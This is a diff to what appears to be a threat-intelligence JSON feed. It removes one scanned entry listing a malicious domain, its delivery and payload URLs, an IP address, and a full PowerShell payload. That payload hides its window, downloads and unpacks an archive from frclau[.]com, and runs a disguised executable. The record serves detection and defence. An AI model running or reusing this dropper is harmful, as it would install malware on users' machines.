@@ -5731,25 +5731,5 @@
     ],
     "ReportId": "cmwbbwwnu04xv0nmldbt2utkz",
     "ScannedAt": "2026-11-10T23:36:23.677000+00:00"
-  },
-  {
-    "UrlDomain": "greggmenu.co.uk",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN",
-      "https://www.opera.com/gx?utm_source=PWNgames&utm_medium=pa&utm_campaign=PWN_NL_SVR_8875_OOM_5542&utm_id=1c57a14951674f70800221494d8f4515&edition=std-2"
-    ],
-    "IP": [
-      "77.37.53.118"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwbbh8q704q80nmlzetfk82h",
-    "ScannedAt": "2026-11-10T23:24:12.796000+00:00"
   }
 ]
